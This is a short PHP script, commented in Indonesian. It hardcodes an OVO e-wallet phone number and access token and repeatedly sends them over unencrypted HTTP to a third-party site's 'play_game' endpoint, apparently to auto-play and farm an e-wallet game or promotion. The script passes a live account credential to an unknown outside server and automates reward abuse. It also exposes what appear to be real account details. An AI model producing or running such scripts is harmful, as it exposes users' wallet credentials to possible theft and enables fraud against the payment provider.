<?php 
$account = "081284320533"; // nomor ovo
$access = "5e52264cba9436e39f7c1cd074e9e14ca81d9bcf"; // access ovo

$max=100; //akan otomatis close apabila sudah max

$i=0;
while ($i < $max) {
	$tf = json_decode(file_get_contents("http://yvelynette17.id/ovo/play_game.php?phone_number=$account&access_code=$access"));
	if($tf->error == false)
	{
		$i++;
		echo "[SUCCESS] " . $tf->message . " [$i]" . "\n";
	} else {
		echo "[FAILED] " . $tf->message . "\n";
	}
}
?>
